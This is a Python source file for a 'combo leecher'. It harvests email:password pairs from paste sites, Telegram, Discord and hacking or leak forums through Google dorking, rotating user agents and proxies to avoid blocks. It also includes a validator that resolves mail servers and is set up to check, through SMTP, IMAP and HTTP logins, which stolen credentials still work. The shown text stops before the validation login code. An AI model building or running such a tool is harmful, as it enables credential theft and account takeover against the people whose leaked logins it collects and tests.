"""
╔══════════════════════════════════════════════════════════════╗
║  COMBO INTELLIGENCE ENGINE — Multi-source Leecher v1.0      ║
║  Scraping · Parsing · Validation · Export                   ║
║  Integrado con Oráculo de Inteligencia                      ║
║                                                              ║
║  Basado en la ingeniería inversa de Joker Combo Leecher,     ║
║  pero 100% open source, sin malware, y desplegable.          ║
╚══════════════════════════════════════════════════════════════╝
"""
import os
import re
import json
import time
import random
import hashlib
import logging
import threading
import smtplib
import socket
import imaplib
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from urllib.parse import quote_plus, urlparse

import requests
from bs4 import BeautifulSoup

from oracle_engine import IntelligenceRecord, OracleEngine, SampleDataGenerator

# DNS resolver with dnspython (pip install dnspython)
# Used for real MX record resolution instead of hardcoded fallback servers
_DNS_AVAILABLE = False
try:
    import dns.resolver
    import dns.exception
    _DNS_AVAILABLE = True
except ImportError:
    pass

logger = logging.getLogger("ComboLeecher")

# ═══════════════════════════════════════════════════════════════
#  DATA MODELS
# ═══════════════════════════════════════════════════════════════

@dataclass
class ComboEntry:
    """A single credential combo extracted from any source."""
    email: str = ""
    username: str = ""
    password: str = ""
    domain: str = ""
    source_url: str = ""
    source_type: str = ""       # pastebin, telegram, dorking, api
    record_type: str = "email:pass"  # email:pass, user:pass
    discovered_at: str = ""
    discovered_date: str = ""
    quality: str = "unknown"    # valid, invalid, unknown, checked
    validation_details: dict = field(default_factory=dict)
    extra_data: dict = field(default_factory=dict)

    def to_dict(self):
        return asdict(self)

    def to_intel_record(self, keyword: str) -> IntelligenceRecord:
        """Convert this combo to an Oracle IntelligenceRecord for indexing."""
        return IntelligenceRecord(
            id=hashlib.md5(f"{self.email}{self.password}{self.source_url}".encode()).hexdigest()[:12],
            keyword=keyword,
            source_url=self.source_url,
            source_type=self.source_type,
            record_type=self.record_type,
            content_preview=f"{self.email}:{self.password[:20]}***" if len(self.password) > 20
                           else f"{self.email}:{self.password}",
            discovered_at=self.discovered_at,
            discovered_date=self.discovered_date,
            severity="critical" if self.quality == "valid" else
                     ("high" if self.quality == "unknown" else "low"),
            domain=self.domain,
            email=self.email,
            username=self.username or self.email.split("@")[0] if "@" in self.email else self.username,
            password=self.password[:100],
            extra_data={
                "quality": self.quality,
                "validation_details": self.validation_details,
                "combo_source": self.source_type,
                **self.extra_data,
            }
        )


@dataclass
class LeechResult:
    """Result of a combo leech operation."""
    keyword: str = ""
    timestamp: str = ""
    combos: list = field(default_factory=list)
    total: int = 0
    valid_count: int = 0
    invalid_count: int = 0
    sources: list = field(default_factory=list)
    errors: list = field(default_factory=list)
    stats: dict = field(default_factory=dict)
    took_seconds: float = 0.0

    def to_dict(self):
        return {
            "keyword": self.keyword,
            "timestamp": self.timestamp,
            "total": self.total,
            "valid_count": self.valid_count,
            "invalid_count": self.invalid_count,
            "sources": self.sources,
            "errors": self.errors,
            "stats": self.stats,
            "took_seconds": round(self.took_seconds, 2),
            "combos": [c.to_dict() for c in self.combos[:100]],
        }


# ═══════════════════════════════════════════════════════════════
#  USER AGENT ROTATION
# ═══════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]


def random_ua() -> str:
    return random.choice(USER_AGENTS)


# ═══════════════════════════════════════════════════════════════
#  PROXY ENGINE (unified — imports from proxy_engine.py)
# ═══════════════════════════════════════════════════════════════

# Import the unified ProxyEngine from the new module.
# Falls back to the basic ProxyManager if proxy_engine.py is not available.
try:
    from proxy_engine import ProxyEngine, ProxyPool, ProxyScraper, detect_vpn
    PROXY_ENGINE_AVAILABLE = True
except ImportError:
    PROXY_ENGINE_AVAILABLE = False
    logger.info("proxy_engine.py not found — using legacy ProxyManager")

# ═══════════════════════════════════════════════════════════════
#  RATE LIMITER
# ═══════════════════════════════════════════════════════════════


# ─── Legacy ProxyManager (siempre definido para scrapers internos) ───
class ProxyManager:
    """
    Legacy ProxyManager (kept for backward compatibility).
    Siempre definido a nivel de módulo, porque los scrapers internos
    (PasteScraper, ForumScraper, TelegramScraper) lo usan
    independientemente de si proxy_engine.py está disponible.
    """
    def __init__(self):
        self.proxies = []
        self._dead = set()
        self._lock = threading.Lock()
        self._load_from_env()

    def _load_from_env(self):
        proxy_list = os.environ.get("COMBO_PROXIES", "")
        if proxy_list:
            for p in proxy_list.split(","):
                p = p.strip()
                if p:
                    self.proxies.append(p)

    def load_from_file(self, path: str):
        try:
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self.proxies.append(line)
            logger.info(f"📥 Loaded {len(self.proxies)} proxies from {path}")
        except Exception as e:
            logger.warning(f"⚠️ Proxy file load failed: {e}")

    def get_random(self) -> Optional[dict]:
        with self._lock:
            alive = [p for p in self.proxies if p not in self._dead]
            if not alive:
                return None
            proxy_str = random.choice(alive)
        return {"http": proxy_str, "https": proxy_str}

    def mark_dead(self, proxy_str: str):
        with self._lock:
            self._dead.add(proxy_str)
            logger.debug(f"💀 Marked proxy dead: {proxy_str[:30]}...")

    def reset_dead(self):
        with self._lock:
            self._dead.clear()

    @property
    def count(self) -> int:
        return len(self.proxies)

    @property
    def alive_count(self) -> int:
        return len(self.proxies) - len(self._dead)


# ═══════════════════════════════════════════════════════════════
#  RATE LIMITER
# ═══════════════════════════════════════════════════════════════

class RateLimiter:
    """Token bucket rate limiter per source."""

    def __init__(self, requests_per_minute: int = 30):
        self.interval = 60.0 / max(requests_per_minute, 1)
        self._last_calls: dict = {}

    def wait(self, source: str = "default"):
        """Wait if needed to respect rate limit for a specific source."""
        last = self._last_calls.get(source, 0.0)
        elapsed = time.time() - last
        if elapsed < self.interval:
            time.sleep(self.interval - elapsed)
        self._last_calls[source] = time.time()


# ═══════════════════════════════════════════════════════════════
#  COMBO PARSER — Pattern Extraction
# ═══════════════════════════════════════════════════════════════

class ComboParser:
    """
    Extracts credential combos from raw text.
    Handles multiple formats: email:pass, user:pass, json, csv, custom.
    """

    # Pattern: email:password (most common)
    PATTERN_EMAIL_PASS = re.compile(
        r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[:;|]\s*(\S+)',
        re.IGNORECASE
    )

    # Pattern: username:password
    PATTERN_USER_PASS = re.compile(
        r'^([a-zA-Z0-9._-]{4,})\s*[:;|]\s*(\S+)',
        re.MULTILINE
    )

    # Pattern: "email":"password" (JSON-like)
    PATTERN_JSON_COMBO = re.compile(
        r'"(?:email|user|username|mail|login)"\s*:\s*"([^"]+)"\s*,\s*"(?:pass|password|passwd|pwd)"\s*:\s*"([^"]+)"',
        re.IGNORECASE
    )

    # Pattern: email | password (pipe-separated CSV)
    PATTERN_CSV_COMBO = re.compile(
        r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|]\s*(\S+)',
        re.IGNORECASE
    )

    # Common password blacklist (avoid noise)
    COMMON_PASSWORDS = {
        "password", "123456", "12345678", "123456789", "qwerty",
        "abc123", "monkey", "letmein", "password1", "12345",
        "111111", "123123", "iloveyou", "shadow", "sunshine",
        "princess", "admin", "welcome", "football", "login",
        "passw0rd", "P@ssw0rd", "changeme", "guest",
    }

    def __init__(self):
        self.stats = {
            "total_lines": 0,
            "parsed_combos": 0,
            "filtered_duplicates": 0,
            "filtered_noise": 0,
        }

    def parse_text(self, text: str, source_url: str = "",
                   source_type: str = "unknown", keyword: str = "") -> List[ComboEntry]:
        """
        Parse raw text and extract all combo entries.
        Returns deduplicated list of ComboEntry.
        """
        entries = []
        seen = set()
        now_iso = datetime.now().isoformat()
        now_date = datetime.now().strftime("%Y-%m-%d")

        if not text:
            return entries

        # Normalize line endings
        text = text.replace("\r\n", "\n").replace("\r", "\n")
        lines = text.split("\n")
        self.stats["total_lines"] = len(lines)

        # Full text as single string for regex
        full_text = text[:500000]  # 500KB limit

        # ── 1. Extract email:password patterns ──
        for match in self.PATTERN_EMAIL_PASS.finditer(full_text):
            email, password = match.groups()
            password = password.strip().strip('"').strip("'")
            if self._is_valid_combo(email, password, seen):
                domain = email.split("@")[-1] if "@" in email else ""
                entries.append(ComboEntry(
                    email=email.strip(),
                    password=password,
                    domain=domain,
                    source_url=source_url,
                    source_type=source_type,
                    record_type="email:pass",
                    discovered_at=now_iso,
                    discovered_date=now_date,
                ))
                seen.add(f"{email.lower()}:{password}")

        # ── 2. Extract JSON combos ──
        for match in self.PATTERN_JSON_COMBO.finditer(full_text):
            email, password = match.groups()
            if self._is_valid_combo(email, password, seen):
                domain = email.split("@")[-1] if "@" in email else ""
                entries.append(ComboEntry(
                    email=email.strip(),
                    password=password.strip(),
                    domain=domain,
                    source_url=source_url,
                    source_type=source_type,
                    record_type="email:pass",
                    discovered_at=now_iso,
                    discovered_date=now_date,
                ))
                seen.add(f"{email.lower()}:{password}")

        # ── 3. Extract user:password (for non-email usernames) ──
        # Only if keyword matches
        if keyword:
            kw_lower = keyword.lower()
            for match in self.PATTERN_USER_PASS.finditer(full_text):
                username, password = match.groups()
                password = password.strip()
                # Must contain keyword or be a reasonable combo
                if kw_lower in username.lower() or kw_lower in password.lower():
                    combo_key = f"{username.lower()}:{password}"
                    if combo_key not in seen and len(password) >= 4:
                        entries.append(ComboEntry(
                            username=username.strip(),
                            password=password,
                            source_url=source_url,
                            source_type=source_type,
                            record_type="user:pass",
                            discovered_at=now_iso,
                            discovered_date=now_date,
                        ))
                        seen.add(combo_key)

        self.stats["parsed_combos"] = len(entries)
        logger.info(f"🔍 Parsed {len(entries)} combos from {source_type} "
                    f"({self.stats['filtered_noise']} filtered, "
                    f"{self.stats['filtered_duplicates']} duplicates)")
        return entries

    def _is_valid_combo(self, email: str, password: str, seen: set) -> bool:
        """Validate a potential combo entry."""
        email = email.strip()
        password = password.strip().strip('"').strip("'")

        # Basic validation
        if not email or not password:
            self.stats["filtered_noise"] += 1
            return False
        if len(email) < 5 or len(password) < 3:
            self.stats["filtered_noise"] += 1
            return False
        if len(password) > 100:
            self.stats["filtered_noise"] += 1
            return False
        if "@" not in email:
            self.stats["filtered_noise"] += 1
            return False

        # Common passwords filter
        if password.lower() in self.COMMON_PASSWORDS:
            self.stats["filtered_noise"] += 1
            return False

        # Duplicate check
        combo_key = f"{email.lower()}:{password}"
        if combo_key in seen:
            self.stats["filtered_duplicates"] += 1
            return False

        # Check if email looks real
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            self.stats["filtered_noise"] += 1
            return False

        return True


# ═══════════════════════════════════════════════════════════════
#  SOURCE SCRAPERS
# ═══════════════════════════════════════════════════════════════

class PasteScraper:
    """Scrapes paste sites for credential combos."""

    PASTE_SITES = [
        {"name": "pastebin",  "search_url": "https://www.google.com/search?q=site:pastebin.com+{keyword}&num=20"},
        {"name": "rentry",    "search_url": "https://www.google.com/search?q=site:rentry.co+{keyword}&num=20"},
        {"name": "ghostbin",  "search_url": "https://www.google.com/search?q=site:ghostbin.co+{keyword}&num=20"},
        {"name": "paste.ee",  "search_url": "https://www.google.com/search?q=site:paste.ee+{keyword}&num=20"},
    ]

    def __init__(self):
        self.session = requests.Session()
        self.parser = ComboParser()
        self.rate_limiter = RateLimiter(requests_per_minute=15)
        self.proxy_mgr = ProxyManager()

    def scrape(self, keyword: str, max_pastes: int = 10) -> List[ComboEntry]:
        """Scrape paste sites for combos related to keyword."""
        all_combos = []
        now_iso = datetime.now().isoformat()
        now_date = datetime.now().strftime("%Y-%m-%d")

        for site in self.PASTE_SITES:
            self.rate_limiter.wait(source=f"paste_{site['name']}")
            try:
                self.session.headers.update({"User-Agent": random_ua()})
                search_url = site["search_url"].replace("{keyword}", quote_plus(keyword))
                proxy = self.proxy_mgr.get_random()

                resp = self.session.get(search_url, timeout=15, proxies=proxy)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, "html.parser")
                links = []

                # Extract links from Google results
                for g in soup.select("div.g")[:max_pastes]:
                    link_el = g.select_one("a")
                    if link_el:
                        url = link_el.get("href", "")
                        if url.startswith("/url?q="):
                            url = url.split("/url?q=")[1].split("&")[0]
                        if url and "http" in url:
                            links.append(url)

                # Fetch each paste and parse combos
                for url in links[:max_pastes]:
                    self.rate_limiter.wait(source=f"fetch_{site['name']}")
                    try:
                        self.session.headers.update({"User-Agent": random_ua()})
                        paste_resp = self.session.get(url, timeout=15, proxies=proxy)
                        if paste_resp.status_code == 200:
                            combos = self.parser.parse_text(
                                paste_resp.text,
                                source_url=url,
                                source_type=site["name"],
                                keyword=keyword,
                            )
                            all_combos.extend(combos)
                    except Exception as e:
                        logger.debug(f"Fetch error {url[:40]}: {e}")
                        if proxy:
                            self.proxy_mgr.mark_dead(str(proxy))

            except Exception as e:
                logger.debug(f"Scrape error for {site['name']}: {e}")

        return all_combos


class TelegramScraper:
    """
    Scrapes Telegram channels for credential combos.
    Uses: t.me/s/ API or Google dorking for Telegram messages.
    """

    def __init__(self):
        self.session = requests.Session()
        self.parser = ComboParser()
        self.rate_limiter = RateLimiter(requests_per_minute=10)

    def scrape(self, keyword: str, channels: list = None) -> List[ComboEntry]:
        """Scrape Telegram channels for combos via Google dorking."""
        all_combos = []

        if channels is None:
            # Auto-discover channels with credential leaks via Google
            channels = self._discover_channels(keyword)

        for channel in channels[:5]:  # Max 5 channels per search
            self.rate_limiter.wait(source=f"tg_{channel}")
            try:
                self.session.headers.update({"User-Agent": random_ua()})

                # Use Google to find Telegram messages
                search_url = (
                    f"https://www.google.com/search?q=site:t.me/{channel}+{quote_plus(keyword)}"
                    f"+email+OR+password+OR+combo&num=20"
                )
                resp = self.session.get(search_url, timeout=15)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, "html.parser")
                for g in soup.select("div.g")[:10]:
                    link_el = g.select_one("a")
                    if link_el:
                        url = link_el.get("href", "")
                        if url.startswith("/url?q="):
                            url = url.split("/url?q=")[1].split("&")[0]

                        snippet_el = g.select_one("div.VwiC3b")
                        snippet = snippet_el.get_text(strip=True) if snippet_el else ""

                        # Parse snippet directly
                        combos = self.parser.parse_text(
                            snippet,
                            source_url=url,
                            source_type="telegram",
                            keyword=keyword,
                        )
                        all_combos.extend(combos)

            except Exception as e:
                logger.debug(f"Telegram scrape error for {channel}: {e}")

        return all_combos

    def _discover_channels(self, keyword: str) -> list:
        """Discover Telegram channels related to a keyword."""
        known_channels = [
            "combolist", "leakbase", "leakzone", "credentialleaks",
            "databreaches", "leakdatabase", "combosource", "leaksource",
        ]
        return known_channels


# ═══════════════════════════════════════════════════════════════
#  DISCORD SCRAPER
# ═══════════════════════════════════════════════════════════════

class DiscordScraper:
    """
    Scrapes Discord servers/channels for credential combos.

    Estrategias:
    1. Google dorking: busca mensajes en discord.com, discordapp.com,
       discord.gg, discord.chat, y discords.com que contengan combos
    2. Google dorking directo: busca "email:pass" + discord en el título
    3. Discord API (opcional): si se configura DISCORD_TOKEN en env,
       puede usar la API oficial de Discord para buscar mensajes

    Discord no tiene un buscador público, pero Google indexa
    muchos mensajes de canales públicos y servidores de Discord.
    """

    # Fuentes de Discord indexadas por Google
    DISCORD_SOURCES = [
        # Discord channels / servers indexados por Google
        {"name": "discord_public",  "dork": "site:discord.com/channels/+{keyword}+email+OR+password+OR+combo+OR+pass+OR+login"},
        {"name": "discord_gg",      "dork": "site:discord.gg+{keyword}+email+OR+password+OR+combo"},
        {"name": "discord_app",     "dork": "site:discordapp.com+{keyword}+email+OR+password+OR+combo"},
        {"name": "discord_servers", "dork": "site:discord.chat+intext:{keyword}+email+OR+password"},
        {"name": "discord_links",   "dork": "inurl:discord.gg+{keyword}+password+OR+pass+OR+combo"},
    ]

    # Palabras clave adicionales para mejorar la búsqueda de combos en Discord
    COMBO_HINTS = ["email:pass", "user:pass", "combo list", "combolist", "leak", "dump", "credentials"]

    def __init__(self):
        self.session = requests.Session()
        self.parser = ComboParser()
        self.rate_limiter = RateLimiter(requests_per_minute=8)  # Más conservador para evitar bloqueos
        self.discord_token = os.environ.get("DISCORD_TOKEN", "")

    def scrape(self, keyword: str, max_results: int = 15) -> List[ComboEntry]:
        """
        Scrape Discord para combos relacionados al keyword.
        Usa Google dorking sobre canales/servidores públicos de Discord.

        Si DISCORD_TOKEN está configurado, también usa la API de Discord
        para buscar mensajes en servidores autorizados.
        """
        all_combos = []

        # ── Estrategia 1: Google dorking sobre Discord ──
        for source in self.DISCORD_SOURCES:
            self.rate_limiter.wait(source=f"discord_{source['name']}")
            try:
                self.session.headers.update({"User-Agent": random_ua()})

                # Construir dork
                dork = source["dork"].replace("{keyword}", quote_plus(keyword))

                # Agregar hints de combo para mejorar precisión
                hint = random.choice(self.COMBO_HINTS)
                search_url = f"https://www.google.com/search?q={dork}+{quote_plus(hint)}&num=20"

                logger.debug(f"🔍 Discord dork: {search_url[:120]}...")
                resp = self.session.get(search_url, timeout=15)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, "html.parser")

                # Extraer URLs y snippets de resultados de Google
                for g in soup.select("div.g")[:max_results]:
                    link_el = g.select_one("a")
                    url = ""
                    if link_el:
                        url = link_el.get("href", "")
                        if url.startswith("/url?q="):
                            url = url.split("/url?q=")[1].split("&")[0]

                    snippet_el = g.select_one("div.VwiC3b")
                    snippet = snippet_el.get_text(strip=True) if snippet_el else ""
                    title_el = g.select_one("h3")
                    title = title_el.get_text(strip=True) if title_el else ""

                    # Combinar título + snippet para parsear
                    full_text = f"{title} {snippet}"
                    if full_text.strip():
                        combos = self.parser.parse_text(
                            full_text,
                            source_url=url,
                            source_type="discord",
                            keyword=keyword,
                        )
                        all_combos.extend(combos)

                        # Si el snippet contiene combos y hay URL, intentar fetch directo
                        if combos and url:
                            try:
                                self.rate_limiter.wait(source="discord_fetch")
                                fetch_resp = self.session.get(url, timeout=10)
                                if fetch_resp.status_code == 200:
                                    more_combos = self.parser.parse_text(
                                        fetch_resp.text,
                                        source_url=url,
                                        source_type="discord",
                                        keyword=keyword,
                                    )
                                    all_combos.extend(more_combos)
                            except Exception:
                                pass

            except Exception as e:
                logger.debug(f"Discord scrape error ({source['name']}): {e}")

        # ── Estrategia 2: API de Discord (si hay token) ──
        if self.discord_token:
            try:
                discord_combos = self._scrape_via_api(keyword)
                all_combos.extend(discord_combos)
            except Exception as e:
                logger.debug(f"Discord API error: {e}")

        logger.info(f"💬 Discord: {len(all_combos)} combos for '{keyword}'")
        return all_combos

    def _scrape_via_api(self, keyword: str) -> List[ComboEntry]:
        """
        Scrape Discord usando la API oficial (requiere token).
        Busca en canales donde el bot tenga acceso.
        Rate-limited a ~10 req/min para evitar bloqueos.
        """
        all_combos = []
        headers = {
            "Authorization": f"Bot {self.discord_token}",
            "User-Agent": "DiscordBot (oraculo-inteligencia, 1.0)",
        }

        # Descubrir canales de texto donde el bot está
        try:
            # Obtener lista de servidores (guilds)
            self.rate_limiter.wait(source="discord_api")
            resp = self.session.get("https://discord.com/api/v10/users/@me/guilds",
                                     headers=headers, timeout=10)
            if resp.status_code != 200:
                return all_combos

            guilds = resp.json()
            logger.debug(f"🔌 Discord: {len(guilds)} servers accessible")

            for guild in guilds[:3]:  # Max 3 servidores
                guild_id = guild.get("id")
                if not guild_id:
                    continue

                # Obtener canales de texto
                self.rate_limiter.wait(source="discord_api")
                channels_resp = self.session.get(
                    f"https://discord.com/api/v10/guilds/{guild_id}/channels",
                    headers=headers, timeout=10
                )
                if channels_resp.status_code != 200:
                    continue

                text_channels = [
                    ch for ch in channels_resp.json()
                    if ch.get("type") == 0  # GUILD_TEXT
                ]

                for channel in text_channels[:5]:  # Max 5 canales por servidor
                    channel_id = channel.get("id")
                    channel_name = channel.get("name", "unknown")

                    # Buscar mensajes con el keyword
                    self.rate_limiter.wait(source="discord_api")
                    search_resp = self.session.get(
                        f"https://discord.com/api/v10/channels/{channel_id}/messages/search",
                        headers=headers,
                        params={"q": keyword, "limit": 25},
                        timeout=10
                    )

                    if search_resp.status_code != 200:
                        continue

                    messages = search_resp.json().get("messages", [])
                    for msg_batch in messages[:10]:
                        for msg in msg_batch:
                            content = msg.get("content", "")
                            if not content:
                                continue

                            combos = self.parser.parse_text(
                                content,
                                source_url=f"https://discord.com/channels/{guild_id}/{channel_id}",
                                source_type="discord_api",
                                keyword=keyword,
                            )
                            all_combos.extend(combos)

        except Exception as e:
            logger.debug(f"Discord API error: {e}")

        return all_combos


# ═══════════════════════════════════════════════════════════════
#  FORUM / LEAK SITE SCRAPER
# ═══════════════════════════════════════════════════════════════

class ForumScraper:
    """
    Scrapes known hacking/leak forums for credential combos.

    Usa Google dorking para encontrar hilos/posts en foros
    conocidos que contengan combos email:pass, user:pass,
    o bases de datos filtradas relacionadas al keyword.

    Foros objetivo:
    - nulled.to, cracked.to, leakzone.xyz, leak.sx
    - leakbase.io, breachforum.to, sin-club, darkweb
    - y foros de hacking/hackforums en general
    """

    FORUMS = [
        # ── Foros de hacking/leaks principales ──
        {"name": "nulled",      "dork": "site:nulled.to+{keyword}+email+OR+password+OR+combo+OR+leak"},
        {"name": "cracked",     "dork": "site:cracked.to+{keyword}+email+OR+password+OR+combo"},
        {"name": "leakzone",    "dork": "site:leakzone.xyz+{keyword}+email+OR+password+OR+combo"},
        {"name": "leaksx",      "dork": "site:leak.sx+{keyword}+email+OR+password+OR+combo"},
        {"name": "leakbase",    "dork": "site:leakbase.io+{keyword}+email+OR+password+OR+combo"},
        {"name": "breachforum", "dork": "site:breachforum.to+{keyword}+email+OR+password+OR+combo"},
        {"name": "sinclub",     "dork": "site:sin-club.org+{keyword}+email+OR+password+OR+combo"},
        {"name": "hackforums",  "dork": "site:hackforums.net+{keyword}+email+OR+password+OR+combo"},
        # ── Foros de datos/combos ──
        {"name": "combolist",   "dork": "site:combolist.org+{keyword}+email+OR+password"},
        {"name": "breachdb",    "dork": "site:breachdb.com+{keyword}+email+OR+password"},
        {"name": "leakchecker",  "dork": "site:leakcheck.io+{keyword}+email+OR+pass"},
        {"name": "darkweb_forum", "dork": "(site:onion.city+OR+site:darknet.co+OR+site:deepweb.com)+{keyword}+email+OR+password"},
        # ── Paste sites extendidos ──
        {"name": "paste_gg",     "dork": "site:paste.gg+{keyword}+email+OR+password+OR+combo"},
        {"name": "paste_fosshub","dork": "site:paste.fosshub.com+{keyword}+email+OR+pass"},
        {"name": "paste_centos",  "dork": "site:paste.centos.org+{keyword}+email+OR+pass"},
    ]

    def __init__(self):
        self.session = requests.Session()
        self.parser = ComboParser()
        self.rate_limiter = RateLimiter(requests_per_minute=12)
        self.proxy_mgr = ProxyManager()

    def scrape(self, keyword: str, max_posts: int = 5) -> List[ComboEntry]:
        """
        Scrape forums/paste sites for combos related to keyword.

        Para cada foro en la lista, ejecuta un dork de Google
        y extrae el snippet + hace fetch del contenido si es posible.
        """
        all_combos = []

        for forum in self.FORUMS:
            self.rate_limiter.wait(source=f"forum_{forum['name']}")
            try:
                self.session.headers.update({"User-Agent": random_ua()})

                dork = forum["dork"].replace("{keyword}", quote_plus(keyword))
                search_url = f"https://www.google.com/search?q={dork}&num=20"

                proxy = self.proxy_mgr.get_random()
                resp = self.session.get(search_url, timeout=15, proxies=proxy)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, "html.parser")
                results_found = 0

                for g in soup.select("div.g")[:max_posts]:
                    link_el = g.select_one("a")
                    url = ""
                    if link_el:
                        url = link_el.get("href", "")
                        if url.startswith("/url?q="):
                            url = url.split("/url?q=")[1].split("&")[0]
                        if not url or "http" not in url:
                            continue

                    snippet_el = g.select_one("div.VwiC3b")
                    snippet = snippet_el.get_text(strip=True) if snippet_el else ""
                    title_el = g.select_one("h3")
                    title = title_el.get_text(strip=True) if title_el else ""

                    # Parsear título + snippet
                    full_text = f"{title} {snippet}"
                    if full_text.strip():
                        combos = self.parser.parse_text(
                            full_text,
                            source_url=url,
                            source_type=forum["name"],
                            keyword=keyword,
                        )

                        if combos:
                            all_combos.extend(combos)
                            results_found += len(combos)

                            # Si encontramos combos en el snippet, intentar
                            # hacer fetch directo de la página para más datos
                            if url:
                                try:
                                    self.rate_limiter.wait(source=f"fetch_{forum['name']}")
                                    fetch_resp = self.session.get(url, timeout=10, proxies=proxy)
                                    if fetch_resp.status_code == 200:
                                        more = self.parser.parse_text(
                                            fetch_resp.text,
                                            source_url=url,
                                            source_type=forum["name"],
                                            keyword=keyword,
                                        )
                                        all_combos.extend(more)
                                except Exception:
                                    pass

                if results_found > 0:
                    logger.debug(f"📋 {forum['name']}: {results_found} combos")

            except Exception as e:
                logger.debug(f"Forum scrape error ({forum['name']}): {e}")
                if proxy:
                    self.proxy_mgr.mark_dead(str(proxy))

        logger.info(f"📋 Forum scrape: {len(all_combos)} combos for '{keyword}'")
        return all_combos


# ═══════════════════════════════════════════════════════════════
#  COMBO VALIDATOR
# ═══════════════════════════════════════════════════════════════

class ComboValidator:
    """
    Validates if credential combos are still active.

    Methods:
      - SMTP: Real MX DNS lookup → SMTP hello → STARTTLS → login
      - HTTP: POST login form with heuristic response analysis
      - IMAP: IMAP SSL login (fallback when SMTP blocked)

    Con dnspython realiza resolución MX real contra los servidores
    de correo del dominio, en vez de depender de un listado hardcodeado.
    """

    # Cache de MX servers por dominio para evitar resolver repetidamente
    _MX_CACHE: Dict[str, Tuple[float, List[str]]] = {}
    _MX_CACHE_TTL = 300  # 5 minutos

    # Puertos SMTP estándar por proveedor
    SMTP_PORTS = [25, 465, 587, 2525]

    def __init__(self):
        self.session = requests.Session()
        self.rate_limiter = RateLimiter(requests_per_minute=5)
        self._lock = threading.Lock()
        self.validated_count = 0
        self._total_smtp_attempts = 0
        self._successful_logins = 0

    # ═══════════════════════════════════════════════════════════
    #  DNS MX RESOLUTION (real, not hardcoded)
    # ═══════════════════════════════════════════════════════════

    def _resolve_mx(self, domain: str) -> List[str]:
        """
        Resolve MX records for a domain using dnspython.
        Returns sorted list of MX server hostnames (lowest priority first).

        Si dnspython no está instalado o la resolución falla,
        intenta lookup con socket.getaddrinfo como fallback
        y finalmente recurre al mapa de servidores conocidos.
        """
        now = time.time()

        # Check cache primero
        with self._lock:
            cached = self._MX_CACHE.get(domain)
            if cached and (now - cached[0]) < self._MX_CACHE_TTL:
                return cached[1]

        servers: List[str] = []
        resolution_method = "unknown"

        # ── Método 1: dnspython (resolución DNS real) ──
        if _DNS_AVAILABLE:
            try:
                answers = dns.resolver.resolve(domain, "MX", lifetime=5)
                # Ordenar por prioridad (la más baja = más prioritaria)
                mx_records = []
                for r in answers:
                    priority = r.preference
                    exchange = str(r.exchange).rstrip(".")
                    mx_records.append((priority, exchange))
                mx_records.sort(key=lambda x: x[0])  # sort by priority
                servers = [host for _, host in mx_records]
                resolution_method = "dns_resolver"
                logger.debug(f"📡 MX for {domain}: {servers} (via dnspython)")
            except dns.resolver.NoAnswer:
                logger.debug(f"📡 No MX records for {domain}")
            except dns.resolver.NXDOMAIN:
                logger.debug(f"📡 Domain {domain} does not exist")
            except dns.exception.Timeout:
                logger.debug(f"📡 DNS timeout for {domain}")
            except Exception as e:
                logger.debug(f"📡 DNS error for {domain}: {e}")
        else:
            logger.debug(f"📡 dnspython not installed — use pip install dnspython for real MX resolution")

        # ── Método 2: Fallback con socket.getaddrinfo ──
        if not servers:
            try:
                # Intentar resolver smtp.{domain} directamente
                info = socket.getaddrinfo(f"smtp.{domain}", 25, socket.AF_INET, socket.SOCK_STREAM)
                if info:
                    servers.append(f"smtp.{domain}")
                    resolution_method = "smtp_fallback"
            except socket.gaierror:
                pass

        # ── Método 3: Mapa de servidores conocidos ──
        if not servers:
            servers = self._get_known_mx(domain)
            resolution_method = "known_map"

        # Actualizar cache
        with self._lock:
            self._MX_CACHE[domain] = (now, servers)

        if servers:
            logger.debug(f"📡 MX for {domain}: {servers[:3]}... (via {resolution_method})")
        return servers

    @staticmethod
    def _get_known_mx(domain: str) -> List[str]:
        """
        Fallback map of known SMTP servers for common email providers.
        Solo se usa cuando la resolución DNS real falla.
        """
        domain_lower = domain.lower().strip()

        # Mapa completo de dominios conocidos → servidores SMTP
        known = {
            # Google / Gmail
            "gmail.com":         ["smtp.gmail.com", "gmail-smtp-in.l.google.com"],
            "googlemail.com":    ["smtp.gmail.com", "gmail-smtp-in.l.google.com"],
            "google.com":        ["smtp.gmail.com"],
            # Microsoft
            "outlook.com":       ["smtp.office365.com", "outlook-com.olc.protection.outlook.com"],
